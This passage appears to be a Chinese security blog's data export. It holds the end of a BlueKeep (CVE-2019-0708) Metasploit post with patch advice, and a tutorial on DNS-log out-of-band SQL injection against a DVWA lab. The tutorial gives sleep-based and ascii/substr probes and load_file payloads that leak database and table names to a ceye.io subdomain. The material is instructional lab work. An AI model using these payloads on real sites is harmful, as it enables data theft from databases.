class=\"headerlink\" title=\"可能存在问题\"></a>可能存在问题</h4><p>* set target 1 - bluescreen(可能出现蓝屏重启)<br>* set target 3 - success<br>如果出现下图:</p>\n<p><img src=\"/images/cve0708/cve1.jpg\"></p>\n<p>尝试设置: set ForceExploit true</p>\n<h2 id=\"漏洞加固\"><a href=\"#漏洞加固\" class=\"headerlink\" title=\"漏洞加固\"></a>漏洞加固</h2><h4 id=\"及时进行补丁更新\"><a href=\"#及时进行补丁更新\" class=\"headerlink\" title=\"及时进行补丁更新\"></a>及时进行补丁更新</h4><p>Microsoft在2019年5月14日修复了该漏洞<br><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708\">补丁下载地址</a><br>以及为已不受微软更新支持的系统(Windows Server 2003和Windows XP)提供的安全更新<br><a href=\"https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708\">补丁下载地址</a></p>\n<h4 id=\"缓解措施\"><a href=\"#缓解措施\" class=\"headerlink\" title=\"缓解措施\"></a>缓解措施</h4><p>在无法及时安装微软安全更新的情况下作为临时性解决方案</p>\n<ul>\n<li>若用户不需要用到远程桌面服务,建议禁用该服务.</li>\n<li>开启网络级别身份验证(NLA),此方案适用于Windows 7, Windows Server 2008, Windows Server 2008 R2 以上缓解措施只能暂时性针对该漏洞对系统进行部分缓解,强烈建议在条件允许的情况下及时安装微软安全更新.</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;pull&#x2F;12283?from&#x3D;timeline&amp;isappinstalled&#x3D;0</span><br><span class=\"line\">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;Mf5TuATyyU7-W2VDHCRKnA</span><br></pre></td></tr></table></figure>\n\n"},{"title":"DNS Log Injection","date":"2020-06-18T14:40:04.000Z","_content":"注入类漏洞我们都了解,比如之前整理SQL Injection时介绍和说明的一样,而今天学习的DNS Log 注入通过名称我们应该也知道,是利用DNS来完成的带外注入的攻击手段,而这些又如何实现的呢?一起慢慢来学习分析.\n\n## DNS定义\n\n### DNS介绍\n\nDNS(Domain Name System，域名系统),它使用层次结构的命名系统,因特网上作为域名和IP地址相互映射的一个分布式数据库系统,能够使用户更方便的访问互联网,而不用去记住能够被机器直接读取的IP数串.通过主机名,最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析).DNS协议运行在UDP协议之上.服务器端工作在UDP协议端口53和TCP协议端口53上.\n\n下图是一个DNS解析模拟过程,其中IPV4对应的是客户端,主机存在对应IP地址,经过DNS解析后会找到对应我们想要访问的WEB应用服务器,从而获取我们想要的资源,后续将会继续介绍DNS的请求流程.\n\n![](/images/DNS_Log/dns.png)\n\n### DNS请求流程\n\nDNS是应用层协议,事实上它是为其它应用层协议工作的,包括不限于HTTP和SMTP以及FTP,用于将用户提供的主机名解析为IP地址.\n\n具体过程如下:\n\n1. 主机向本地域名服务器实行递归查询,如果本地无法查询域名对应的IP地址时,此时本地域名服务器就以DNS客户的身份,向其他根域名服务器继续发出查询请求报文(替主机继续查询),而不是让主机自己进行下一步查询.\n2. 本地域名服务器向根域名服务器实现迭代查询,根域名服务器收到本地域名服务器发来的查询请求后,如果根域名服务器可以直接查询得到对应IP地址直接回复即可,如果此根域名服务器查询不到,那么它会告知本地域名服务器让它下一步请求哪一个根域名服务器.本地域名服务器获得下一步“指示”后去请求另一根域名服务器,直到获取请求中的域名对应IP地址,本地域名服务器获得IP后会告知开始请求的主机它请求域名对应IP地址,整个DNS查询基本完成.\n3. 主机获得本地域名服务器回复的IP地址,就可以向该IP地址进行HTTP服务器发起TCP连接.\n\n### DNS体系结构\n\n从用户主机上调用应用程序的角度看,DNS是一个提供简单、直接的转换服务的黑盒子.但事实上.实现这个服务的黑盒子非常复杂,它由分布于全球的大量DNS服务器以及定义了DNS服务器与查询主机通信方式的应用层协议组成.\n\nDNS的一种简单的设计模式就是在因特网上只使用一个DNS服务器,该服务器包含所有的映射,在这种集中式的设计中,客户机直接将所有查询请求发往单一的DNS服务器,同时该DNS服务器直接对所有查询客户机做出响应,尽管这种设计方式非常诱人.\n\n但他不适用当前的互联网,因为当今的因特网有着数量巨大并且在持续增长的主机,这种集中式设计会有单点故障,通信容量(上亿台主机发送的查询DNS报文请求,包括但不限于所有的HTTP请求,电子邮件报文服务器,TCP长连接服务),远距离的时间延迟,维护开销大(因为所有的主机名-ip映射都要在一个服务站点更新)等问题.\n\nDNS服务器一般分三种,根DNS服务器,顶级DNS服务器,权威DNS服务器.使用分布式的层次数据库模式以及缓存方法来解决单点集中式的问题.\n\nDNS 域名称:\n\n| DNS域名 |       组织类型       |\n| :-----: | :------------------: |\n|   gov   | 非军事政府机构(政府) |\n|   mil   |     军事政府机构     |\n|   edu   |       教育机构       |\n|   com   |       商业公司       |\n|   net   |       网络公司       |\n|   ...   |         ...          |\n\n客户机上用nslookup命令查询一下 `www.test3.com`,马上可以看到本地DNS服务器(192.168.88.10)直接查全球13台根域中的某几台,然后一步步解析,通过迭代的方式,直到找到 `www.test3.com`对应的IP为68.178.213.61.本地DNS服务器得到test3域的IP后,它把这个IP返回给192.168.88.126客户机,完成解析.\n\n![](/images/DNS_Log/Wireshark.png)\n\n<center>Wireshark检测截图</center>\n\n### DNS的重要性\n\n这13台根服务器可以指挥浏览器(比如.internet explorer)和电子邮件程序(比如.Firefox)以控制互联网通信.由于根服务器中有经美国政府批准的260个左右的互联网后缀(如．com、．net等)和一些国家的指定符.\n\n曾经一位互联网资深专家解释说,美国控制了域名解析的根服务器,也就控制了相应的所有域名,如果美国不想让人访问某些域名,就可以屏蔽掉这些域名,使它们的IP地址无法解析出来,那么这些域名所指向的网站就相当于从互联网的世界中消失了.比如:2004年4月,由于“.ly”域名瘫痪,导致利比亚从互联网上消失了3天.\n\n### DNS攻击中应用\n\n以上已经了解了DNS整个流程,但是DNS如何利用到攻击中呢?而上面也已经介绍了DNS整个过程并不存在可利用的攻击,除非运营商进行DNS劫持去发发广告之类的事情.\n\n但我们知道在SQL注入中有一种姿势是延迟注入(时间延迟)来判断注入以及其他敏感数据信息.但,我们知道延迟注入非常费时不容易被发现,所以现在有种方式可以解决此类无法直接显示报错/查询结果的一种攻击方式,DNS Log注入可以满足这一姿势.\n\n## ceye.io介绍\n\n在进行介绍DNS Log注入之前我们又不得不介绍下一个带外工具,那就是大家熟知的一个平台:ceye.\n\n### ceye.io作用\n\nCEYE是一个用来检测带外(Out-of-Band)流量的监控平台,如DNS查询和HTTP请求.它可以帮助安全研究人员在测试漏洞时收集信息(例如SSRF/XXE/RFI/RCE等),具体的介绍可以参考ceye的官网介绍.\n\n### 产生背景\n\n漏洞检测或漏洞利用需要进一步完成用户或系统交互,一些漏洞类型没有直接表明(回显)攻击是否成功;如Payload触发了却不在前端页面显示.为了解决这个问题,于是就开发了CEYE平台.通过使用诸如DNS和HTTP之类的带外信道,便可以得到回显信息.\n\n### 如何使用\n\n登录ceye.io,在用户详情页可以看到自己的域名标识符 identifier,对于每个用户,都有唯一的域名标识符如:abcdef.ceye.io,所有来自于abcdef.ceye.io或*.abcdef.ceye.io的DNS查询和HTTP请求都会被记录.通过查看这些记录信息,安全研究人员可以确认并改进自己的漏洞研究方案(其他使用参考官网使用手册).\n\n注册后会分配identifier\n\n![](/images/DNS_Log/ceye.png)\n\n#### DNS带外信道检测 Blind Payload 流程\n\n![](/images/DNS_Log/dns_out.png)\n\n<center>DNS Log带外注入一般流程</center>\n\n#### 本地测试\n\n通过上面我们已经注册了ceye并生成了一个三级域名.\n\n1、首先到profile中添加需要解析的DNS服务器地址,可以添加多个\n\n![](/images/DNS_Log/ceye1.png)\n\n2、在终端中输入\n\nnslookup test.u7tu9q.ceye.io\n\n![](/images/DNS_Log/ns.png)\n\n3、回到终端中可以获取DNS查询数据\n\n![](/images/DNS_Log/ceye2.png)\n\n#### HTTP带外信道检测\n\n可以通过终端或浏览器方式进行HTTP请求目标主机,并携带DNS的三级域名获取返回数据包信息.\n\n![](/images/DNS_Log/curl.png)\n\n![](/images/DNS_Log/ceye3.png)\n\n## DNS Log Injection实战\n\n### 准备\n\n1. MAMP集成环境\n2. DVWA源码\n3. CEYE.io平台\n4. 火狐/Chrome及Hackbar插件\n5. Burp Suite1.7.30\n\n### Start\n\n0x1:环境搭建部分省略\n\n环境搭建部分可以直接参考网上即可,这里不做介绍.\n\n0x2:URL访问\n\n键入id=1时会输出id存在数据库中.\n\n```php+HTML\nid=1&Submit=%C3%A6%C2%8F%C2%90%C3%A4%C2%BA%C2%A4#\n```\n\n![](/images/DNS_Log/dvwa.png)\n\n0x3:单引号测试\n\n```php+HTML\nid=1%27&Submit=%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90% C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#\n```\n\n![](/images/DNS_Log/dvwa1.png)\n\n0x4:无报错信息\n\n可能无法判断是否存在注入(实际中不会有类似黑色部分提醒),后续判断是否存在注入，通过sleep判断服务器是否存在访问延迟,如果存在,说明存在盲注(这里可以参考之前发的SQL Inject Cheat sheet).\n\n```php+HTML\nid=1%27%20and%20sleep(10)--+&Submit=%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90 %C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#\n```\n\n![](/images/DNS_Log/dvwa2.png)\n\n0x5:其他手工检测\n\n在介绍SQL的时候我们知道可以通过ascii、substr等函数进行一个一个字符进行判断,但,我们知道那样效率太低.\n\n如:判断数据库中第一张表的第一个字符的ascii码:\n\n```sql\nid=1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103--+&Submit=Ã¦ÂÂÃ¤ÂºÂ¤#\n```\n\n![](/images/DNS_Log/dvwa3.png)\n\n0x6:DNS Log检测\n\n登录平台,清理DNS Query查询\n\n![](/images/DNS_Log/ceye4.png)\n\n0x7:构造payload\n\n```sql\nid=1' and if((select load_file(concat('\\\\\\\\',(select database()),'.u7tu9q.ceye.io\\\\abc'))),1,1)--+ URL:id=1' and if((select load_file(concat('\\\\\\\\',(select database()),'.u7tu9q.ceye.io\\\\abc'))),1,1)--+ &Submit=Ã¦ÂÂÃ¤ÂºÂ¤#\n```\n\n![](/images/DNS_Log/dvwa4.png)\n\n0x8:查询结果\n\n如下图得知:\n\n![](/images/DNS_Log/ceye5.png)\n\n0x9:其他payload\n\n获取信息可以通过修改常规注入时payload一致.\n\n```sql\nid=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=\"dvwa\" limit 0,1),'.u7tu9q.ceye.io\\\\abc'))),1,1)--+ &Submit=Ã¦ÂÂÃ¤ÂºÂ¤#\n```\n\n![](/images/DNS_Log/dvwa5.png)\n\n![](/images/DNS_Log/ceye6.png)\n\n0x10:其他\n\n其他payload不一一测试,可自行测试.\n\n### 英文参考\n\n英文版的相关介绍可参考以下pdf文件,自行下载查阅.\n\n[DNS_Log_Injection](http://www.si1ent.xyz/ziliao/DNSLogSQLInjection.pdf)\n\n## 参考\n\n```php+HTML\nhttps://www.seceye.cn/710.html\nhttp://byd.dropsec.xyz/2016/12/04/dnslog%E5%88%A9%E7%94%A8/\nhttps://bbs.ichunqiu.com/thread-22002-1-1.html\nhttps://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20D ata%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks\n```\n\n","source":"_posts/DNS-Log-Injection.md","raw":"---\ntitle: DNS Log Injection\ndate: 2020-06-18 22:40:04\ntags:\n - DNS-Injection\n---\n注入类漏洞我们都了解,比如之前整理SQL Injection时介绍和说明的一样,而今天学习的DNS Log 注入通过名称我们应该也知道,是利用DNS来完成的带外注入的攻击手段,而这些又如何实现的呢?一起慢慢来学习分析.\n\n## DNS定义\n\n### DNS介绍\n\nDNS(Domain Name System，域名系统),它使用层次结构的命名系统,因特网上作为域名和IP地址相互映射的一个分布式数据库系统,能够使用户更方便的访问互联网,而不用去记住能够被机器直接读取的IP数串.通过主机名,最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析).DNS协议运行在UDP协议之上.服务器端工作在UDP协议端口53和TCP协议端口53上.\n\n下图是一个DNS解析模拟过程,其中IPV4对应的是客户端,主机存在对应IP地址,经过DNS解析后会找到对应我们想要访问的WEB应用服务器,从而获取我们想要的资源,后续将会继续介绍DNS的请求流程.\n\n![](/images/DNS_Log/dns.png)\n\n### DNS请求流程\n\nDNS是应用层协议,事实上它是为其它应用层协议工作的,包括不限于HTTP和SMTP以及FTP,用于将用户提供的主机名解析为IP地址.\n\n具体过程如下:\n\n1. 主机向本地域名服务器实行递归查询,如果本地无法查询域名对应的IP地址时,此时本地域名服务器就以DNS客户的身份,向其他根域名服务器继续发出查询请求报文(替主机继续查询),而不是让主机自己进行下一步查询.\n2. 本地域名服务器向根域名服务器实现迭代查询,根域名服务器收到本地域名服务器发来的查询请求后,如果根域名服务器可以直接查询得到对应IP地址直接回复即可,如果此根域名服务器查询不到,那么它会告知本地域名服务器让它下一步请求哪一个根域名服务器.本地域名服务器获得下一步“指示”后去请求另一根域名服务器,直到获取请求中的域名对应IP地址,本地域名服务器获得IP后会告知开始请求的主机它请求域名对应IP地址,整个DNS查询基本完成.\n3. 主机获得本地域名服务器回复的IP地址,就可以向该IP地址进行HTTP服务器发起TCP连接.\n\n### DNS体系结构\n\n从用户主机上调用应用程序的角度看,DNS是一个提供简单、直接的转换服务的黑盒子.但事实上.实现这个服务的黑盒子非常复杂,它由分布于全球的大量DNS服务器以及定义了DNS服务器与查询主机通信方式的应用层协议组成.\n\nDNS的一种简单的设计模式就是在因特网上只使用一个DNS服务器,该服务器包含所有的映射,在这种集中式的设计中,客户机直接将所有查询请求发往单一的DNS服务器,同时该DNS服务器直接对所有查询客户机做出响应,尽管这种设计方式非常诱人.\n\n但他不适用当前的互联网,因为当今的因特网有着数量巨大并且在持续增长的主机,这种集中式设计会有单点故障,通信容量(上亿台主机发送的查询DNS报文请求,包括但不限于所有的HTTP请求,电子邮件报文服务器,TCP长连接服务),远距离的时间延迟,维护开销大(因为所有的主机名-ip映射都要在一个服务站点更新)等问题.\n\nDNS服务器一般分三种,根DNS服务器,顶级DNS服务器,权威DNS服务器.使用分布式的层次数据库模式以及缓存方法来解决单点集中式的问题.\n\nDNS 域名称:\n\n| DNS域名 |       组织类型       |\n| :-----: | :------------------: |\n|   gov   | 非军事政府机构(政府) |\n|   mil   |     军事政府机构     |\n|   edu   |       教育机构       |\n|   com   |       商业公司       |\n|   net   |       网络公司       |\n|   ...   |         ...          |\n\n客户机上用nslookup命令查询一下 `www.test3.com`,马上可以看到本地DNS服务器(192.168.88.10)直接查全球13台根域中的某几台,然后一步步解析,通过迭代的方式,直到找到 `www.test3.com`对应的IP为68.178.213.61.本地DNS服务器得到test3域的IP后,它把这个IP返回给192.168.88.126客户机,完成解析.\n\n![](/images/DNS_Log/Wireshark.png)\n\n<center>Wireshark检测截图</center>\n\n### DNS的重要性\n\n这13台根服务器可以指挥浏览器(比如.internet explorer)和电子邮件程序(比如.Firefox)以控制互联网通信.由于根服务器中有经美国政府批准的260个左右的互联网后缀(如．com、．net等)和一些国家的指定符.\n\n曾经一位互联网资深专家解释说,美国控制了域名解析的根服务器,也就控制了相应的所有域名,如果美国不想让人访问某些域名,就可以屏蔽掉这些域名,使它们的IP地址无法解析出来,那么这些域名所指向的网站就相当于从互联网的世界中消失了.比如:2004年4月,由于“.ly”域名瘫痪,导致利比亚从互联网上消失了3天.\n\n### DNS攻击中应用\n\n以上已经了解了DNS整个流程,但是DNS如何利用到攻击中呢?而上面也已经介绍了DNS整个过程并不存在可利用的攻击,除非运营商进行DNS劫持去发发广告之类的事情.\n\n但我们知道在SQL注入中有一种姿势是延迟注入(时间延迟)来判断注入以及其他敏感数据信息.但,我们知道延迟注入非常费时不容易被发现,所以现在有种方式可以解决此类无法直接显示报错/查询结果的一种攻击方式,DNS Log注入可以满足这一姿势.\n\n## ceye.io介绍\n\n在进行介绍DNS Log注入之前我们又不得不介绍下一个带外工具,那就是大家熟知的一个平台:ceye.\n\n### ceye.io作用\n\nCEYE是一个用来检测带外(Out-of-Band)流量的监控平台,如DNS查询和HTTP请求.它可以帮助安全研究人员在测试漏洞时收集信息(例如SSRF/XXE/RFI/RCE等),具体的介绍可以参考ceye的官网介绍.\n\n### 产生背景\n\n漏洞检测或漏洞利用需要进一步完成用户或系统交互,一些漏洞类型没有直接表明(回显)攻击是否成功;如Payload触发了却不在前端页面显示.为了解决这个问题,于是就开发了CEYE平台.通过使用诸如DNS和HTTP之类的带外信道,便可以得到回显信息.\n\n### 如何使用\n\n登录ceye.io,在用户详情页可以看到自己的域名标识符 identifier,对于每个用户,都有唯一的域名标识符如:abcdef.ceye.io,所有来自于abcdef.ceye.io或*.abcdef.ceye.io的DNS查询和HTTP请求都会被记录.通过查看这些记录信息,安全研究人员可以确认并改进自己的漏洞研究方案(其他使用参考官网使用手册).\n\n注册后会分配identifier\n\n![](/images/DNS_Log/ceye.png)\n\n#### DNS带外信道检测 Blind Payload 流程\n\n![](/images/DNS_Log/dns_out.png)\n\n<center>DNS Log带外注入一般流程</center>\n\n#### 本地测试\n\n通过上面我们已经注册了ceye并生成了一个三级域名.\n\n1、首先到profile中添加需要解析的DNS服务器地址,可以添加多个\n\n![](/images/DNS_Log/ceye1.png)\n\n2、在终端中输入\n\nnslookup test.u7tu9q.ceye.io\n\n![](/images/DNS_Log/ns.png)\n\n3、回到终端中可以获取DNS查询数据\n\n![](/images/DNS_Log/ceye2.png)\n\n#### HTTP带外信道检测\n\n可以通过终端或浏览器方式进行HTTP请求目标主机,并携带DNS的三级域名获取返回数据包信息.\n\n![](/images/DNS_Log/curl.png)\n\n![](/images/DNS_Log/ceye3.png)\n\n## DNS Log Injection实战\n\n### 准备\n\n1. MAMP集成环境\n2. DVWA源码\n3. CEYE.io平台\n4. 火狐/Chrome及Hackbar插件\n5. Burp Suite1.7.30\n\n### Start\n\n0x1:环境搭建部分省略\n\n环境搭建部分可以直接参考网上即可,这里不做介绍.\n\n0x2:URL访问\n\n键入id=1时会输出id存在数据库中.\n\n```php+HTML\nid=1&Submit=%C3%A6%C2%8F%C2%90%C3%A4%C2%BA%C2%A4#\n```\n\n![](/images/DNS_Log/dvwa.png)\n\n0x3:单引号测试\n\n```php+HTML\nid=1%27&Submit=%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90% C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#\n```\n\n![](/images/DNS_Log/dvwa1.png)\n\n0x4:无报错信息\n\n可能无法判断是否存在注入(实际中不会有类似黑色部分提醒),后续判断是否存在注入，通过sleep判断服务器是否存在访问延迟,如果存在,说明存在盲注(这里可以参考之前发的SQL Inject Cheat sheet).\n\n```php+HTML\nid=1%27%20and%20sleep(10)--+&Submit=%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90 %C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#\n```\n\n![](/images/DNS_Log/dvwa2.png)\n\n0x5:其他手工检测\n\n在介绍SQL的时候我们知道可以通过ascii、substr等函数进行一个一个字符进行判断,但,我们知道那样效率太低.\n\n如:判断数据库中第一张表的第一个字符的ascii码:\n\n```sql\nid=1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103--+&Submit=Ã¦ÂÂÃ¤ÂºÂ¤#\n```\n\n![](/images/DNS_Log/dvwa3.png)\n\n0x6:DNS Log检测\n\n登录平台,清理DNS Query查询\n\n![](/images/DNS_Log/ceye4.png)\n\n0x7:构造payload\n\n```sql\nid=1' and if((select load_file(concat('\\\\\\\\',(select database()),'.u7tu9q.ceye.io\\\\abc'))),1,1)--+ URL:id=1' and if((select load_file(concat('\\\\\\\\',(select database()),'.u7tu9q.ceye.io\\\\abc'))),1,1)--+ &Submit=Ã¦ÂÂÃ¤ÂºÂ¤#\n```\n\n![](/images/DNS_Log/dvwa4.png)\n\n0x8:查询结果\n\n如下图得知:\n\n![](/images/DNS_Log/ceye5.png)\n\n0x9:其他payload\n\n获取信息可以通过修改常规注入时payload一致.\n\n```sql\nid=1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=\"dvwa\" limit 0,1),'.u7tu9q.ceye.io\\\\abc'))),1,1)--+ &Submit=Ã¦ÂÂÃ¤ÂºÂ¤#\n```\n\n![](/images/DNS_Log/dvwa5.png)\n\n![](/images/DNS_Log/ceye6.png)\n\n0x10:其他\n\n其他payload不一一测试,可自行测试.\n\n### 英文参考\n\n英文版的相关介绍可参考以下pdf文件,自行下载查阅.\n\n[DNS_Log_Injection](http://www.si1ent.xyz/ziliao/DNSLogSQLInjection.pdf)\n\n## 参考\n\n```php+HTML\nhttps://www.seceye.cn/710.html\nhttp://byd.dropsec.xyz/2016/12/04/dnslog%E5%88%A9%E7%94%A8/\nhttps://bbs.ichunqiu.com/thread-22002-1-1.html\nhttps://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20D ata%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks\n```\n\n","slug":"DNS-Log-Injection","published":1,"updated":"2020-10-23T03:34:41.931Z","_id":"ckglobhdf0005b1hq5jo5devl","comments":1,"layout":"post","photos":[],"link":"","content":"<p>注入类漏洞我们都了解,比如之前整理SQL Injection时介绍和说明的一样,而今天学习的DNS Log 注入通过名称我们应该也知道,是利用DNS来完成的带外注入的攻击手段,而这些又如何实现的呢?一起慢慢来学习分析.</p>\n<h2 id=\"DNS定义\"><a href=\"#DNS定义\" class=\"headerlink\" title=\"DNS定义\"></a>DNS定义</h2><h3 id=\"DNS介绍\"><a href=\"#DNS介绍\" class=\"headerlink\" title=\"DNS介绍\"></a>DNS介绍</h3><p>DNS(Domain Name System，域名系统),它使用层次结构的命名系统,因特网上作为域名和IP地址相互映射的一个分布式数据库系统,能够使用户更方便的访问互联网,而不用去记住能够被机器直接读取的IP数串.通过主机名,最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析).DNS协议运行在UDP协议之上.服务器端工作在UDP协议端口53和TCP协议端口53上.</p>\n<p>下图是一个DNS解析模拟过程,其中IPV4对应的是客户端,主机存在对应IP地址,经过DNS解析后会找到对应我们想要访问的WEB应用服务器,从而获取我们想要的资源,后续将会继续介绍DNS的请求流程.</p>\n<p><img src=\"/images/DNS_Log/dns.png\"></p>\n<h3 id=\"DNS请求流程\"><a href=\"#DNS请求流程\" class=\"headerlink\" title=\"DNS请求流程\"></a>DNS请求流程</h3><p>DNS是应用层协议,事实上它是为其它应用层协议工作的,包括不限于HTTP和SMTP以及FTP,用于将用户提供的主机名解析为IP地址.</p>\n<p>具体过程如下:</p>\n<ol>\n<li>主机向本地域名服务器实行递归查询,如果本地无法查询域名对应的IP地址时,此时本地域名服务器就以DNS客户的身份,向其他根域名服务器继续发出查询请求报文(替主机继续查询),而不是让主机自己进行下一步查询.</li>\n<li>本地域名服务器向根域名服务器实现迭代查询,根域名服务器收到本地域名服务器发来的查询请求后,如果根域名服务器可以直接查询得到对应IP地址直接回复即可,如果此根域名服务器查询不到,那么它会告知本地域名服务器让它下一步请求哪一个根域名服务器.本地域名服务器获得下一步“指示”后去请求另一根域名服务器,直到获取请求中的域名对应IP地址,本地域名服务器获得IP后会告知开始请求的主机它请求域名对应IP地址,整个DNS查询基本完成.</li>\n<li>主机获得本地域名服务器回复的IP地址,就可以向该IP地址进行HTTP服务器发起TCP连接.</li>\n</ol>\n<h3 id=\"DNS体系结构\"><a href=\"#DNS体系结构\" class=\"headerlink\" title=\"DNS体系结构\"></a>DNS体系结构</h3><p>从用户主机上调用应用程序的角度看,DNS是一个提供简单、直接的转换服务的黑盒子.但事实上.实现这个服务的黑盒子非常复杂,它由分布于全球的大量DNS服务器以及定义了DNS服务器与查询主机通信方式的应用层协议组成.</p>\n<p>DNS的一种简单的设计模式就是在因特网上只使用一个DNS服务器,该服务器包含所有的映射,在这种集中式的设计中,客户机直接将所有查询请求发往单一的DNS服务器,同时该DNS服务器直接对所有查询客户机做出响应,尽管这种设计方式非常诱人.</p>\n<p>但他不适用当前的互联网,因为当今的因特网有着数量巨大并且在持续增长的主机,这种集中式设计会有单点故障,通信容量(上亿台主机发送的查询DNS报文请求,包括但不限于所有的HTTP请求,电子邮件报文服务器,TCP长连接服务),远距离的时间延迟,维护开销大(因为所有的主机名-ip映射都要在一个服务站点更新)等问题.</p>\n<p>DNS服务器一般分三种,根DNS服务器,顶级DNS服务器,权威DNS服务器.使用分布式的层次数据库模式以及缓存方法来解决单点集中式的问题.</p>\n<p>DNS 域名称:</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">DNS域名</th>\n<th align=\"center\">组织类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">gov</td>\n<td align=\"center\">非军事政府机构(政府)</td>\n</tr>\n<tr>\n<td align=\"center\">mil</td>\n<td align=\"center\">军事政府机构</td>\n</tr>\n<tr>\n<td align=\"center\">edu</td>\n<td align=\"center\">教育机构</td>\n</tr>\n<tr>\n<td align=\"center\">com</td>\n<td align=\"center\">商业公司</td>\n</tr>\n<tr>\n<td align=\"center\">net</td>\n<td align=\"center\">网络公司</td>\n</tr>\n<tr>\n<td align=\"center\">…</td>\n<td align=\"center\">…</td>\n</tr>\n</tbody></table>\n<p>客户机上用nslookup命令查询一下 <code>www.test3.com</code>,马上可以看到本地DNS服务器(192.168.88.10)直接查全球13台根域中的某几台,然后一步步解析,通过迭代的方式,直到找到 <code>www.test3.com</code>对应的IP为68.178.213.61.本地DNS服务器得到test3域的IP后,它把这个IP返回给192.168.88.126客户机,完成解析.</p>\n<p><img src=\"/images/DNS_Log/Wireshark.png\"></p>\n<center>Wireshark检测截图</center>\n\n<h3 id=\"DNS的重要性\"><a href=\"#DNS的重要性\" class=\"headerlink\" title=\"DNS的重要性\"></a>DNS的重要性</h3><p>这13台根服务器可以指挥浏览器(比如.internet explorer)和电子邮件程序(比如.Firefox)以控制互联网通信.由于根服务器中有经美国政府批准的260个左右的互联网后缀(如．com、．net等)和一些国家的指定符.</p>\n<p>曾经一位互联网资深专家解释说,美国控制了域名解析的根服务器,也就控制了相应的所有域名,如果美国不想让人访问某些域名,就可以屏蔽掉这些域名,使它们的IP地址无法解析出来,那么这些域名所指向的网站就相当于从互联网的世界中消失了.比如:2004年4月,由于“.ly”域名瘫痪,导致利比亚从互联网上消失了3天.</p>\n<h3 id=\"DNS攻击中应用\"><a href=\"#DNS攻击中应用\" class=\"headerlink\" title=\"DNS攻击中应用\"></a>DNS攻击中应用</h3><p>以上已经了解了DNS整个流程,但是DNS如何利用到攻击中呢?而上面也已经介绍了DNS整个过程并不存在可利用的攻击,除非运营商进行DNS劫持去发发广告之类的事情.</p>\n<p>但我们知道在SQL注入中有一种姿势是延迟注入(时间延迟)来判断注入以及其他敏感数据信息.但,我们知道延迟注入非常费时不容易被发现,所以现在有种方式可以解决此类无法直接显示报错/查询结果的一种攻击方式,DNS Log注入可以满足这一姿势.</p>\n<h2 id=\"ceye-io介绍\"><a href=\"#ceye-io介绍\" class=\"headerlink\" title=\"ceye.io介绍\"></a>ceye.io介绍</h2><p>在进行介绍DNS Log注入之前我们又不得不介绍下一个带外工具,那就是大家熟知的一个平台:ceye.</p>\n<h3 id=\"ceye-io作用\"><a href=\"#ceye-io作用\" class=\"headerlink\" title=\"ceye.io作用\"></a>ceye.io作用</h3><p>CEYE是一个用来检测带外(Out-of-Band)流量的监控平台,如DNS查询和HTTP请求.它可以帮助安全研究人员在测试漏洞时收集信息(例如SSRF/XXE/RFI/RCE等),具体的介绍可以参考ceye的官网介绍.</p>\n<h3 id=\"产生背景\"><a href=\"#产生背景\" class=\"headerlink\" title=\"产生背景\"></a>产生背景</h3><p>漏洞检测或漏洞利用需要进一步完成用户或系统交互,一些漏洞类型没有直接表明(回显)攻击是否成功;如Payload触发了却不在前端页面显示.为了解决这个问题,于是就开发了CEYE平台.通过使用诸如DNS和HTTP之类的带外信道,便可以得到回显信息.</p>\n<h3 id=\"如何使用\"><a href=\"#如何使用\" class=\"headerlink\" title=\"如何使用\"></a>如何使用</h3><p>登录ceye.io,在用户详情页可以看到自己的域名标识符 identifier,对于每个用户,都有唯一的域名标识符如:abcdef.ceye.io,所有来自于abcdef.ceye.io或*.abcdef.ceye.io的DNS查询和HTTP请求都会被记录.通过查看这些记录信息,安全研究人员可以确认并改进自己的漏洞研究方案(其他使用参考官网使用手册).</p>\n<p>注册后会分配identifier</p>\n<p><img src=\"/images/DNS_Log/ceye.png\"></p>\n<h4 id=\"DNS带外信道检测-Blind-Payload-流程\"><a href=\"#DNS带外信道检测-Blind-Payload-流程\" class=\"headerlink\" title=\"DNS带外信道检测 Blind Payload 流程\"></a>DNS带外信道检测 Blind Payload 流程</h4><p><img src=\"/images/DNS_Log/dns_out.png\"></p>\n<center>DNS Log带外注入一般流程</center>\n\n<h4 id=\"本地测试\"><a href=\"#本地测试\" class=\"headerlink\" title=\"本地测试\"></a>本地测试</h4><p>通过上面我们已经注册了ceye并生成了一个三级域名.</p>\n<p>1、首先到profile中添加需要解析的DNS服务器地址,可以添加多个</p>\n<p><img src=\"/images/DNS_Log/ceye1.png\"></p>\n<p>2、在终端中输入</p>\n<p>nslookup test.u7tu9q.ceye.io</p>\n<p><img 